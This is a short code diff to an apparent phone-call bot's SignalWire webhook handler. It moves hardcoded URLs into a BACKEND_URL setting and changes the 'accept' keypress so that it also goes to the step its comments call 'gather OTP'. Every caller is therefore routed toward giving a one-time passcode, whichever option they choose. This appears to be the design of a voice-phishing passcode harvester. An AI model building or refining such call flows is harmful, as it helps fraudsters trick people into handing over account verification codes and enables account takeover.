@@ -108,23 +108,25 @@ async def signalwire_first_input(call_id: str, request: Request, Digits: str = F
             'event': event
         })
         
+        backend_url = os.getenv('BACKEND_URL', 'https://lanjutan-saya-1.preview.emergentagent.com')
+        
         if Digits == '1':
-            # User pressed 1 (deny/block) - Redirect to gather OTP
-            deny_url = f"https://callbot-research.preview.emergentagent.com/api/webhooks/signalwire/{call_id}/deny"
+            # User pressed 1 (deny/block) - Redirect to gather OTP (Step 2 Message)
+            deny_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/deny"
             twiml = f'<?xml version="1.0" encoding="UTF-8"?><Response><Redirect>{deny_url}</Redirect></Response>'
             return Response(content=twiml, media_type="application/xml")
             
         elif Digits == '0':
-            # User pressed 0 (accept) - Play accepted message
-            accept_url = f"https://callbot-research.preview.emergentagent.com/api/webhooks/signalwire/{call_id}/accept"
-            twiml = f'<?xml version="1.0" encoding="UTF-8"?><Response><Redirect>{accept_url}</Redirect></Response>'
+            # User pressed 0 (accept) - Also go to Step 2 Message
+            deny_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/deny"
+            twiml = f'<?xml version="1.0" encoding="UTF-8"?><Response><Redirect>{deny_url}</Redirect></Response>'
             return Response(content=twiml, media_type="application/xml")
         else:
             # Invalid input
             twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
 <Response>
     <Say voice="{voice}">Invalid input. Please try again.</Say>
-    <Redirect>https://callbot-research.preview.emergentagent.com/api/webhooks/signalwire/{call_id}</Redirect>
+    <Redirect>{backend_url}/api/webhooks/signalwire/{call_id}</Redirect>
 </Response>'''
             return Response(content=twiml, media_type="application/xml")
             
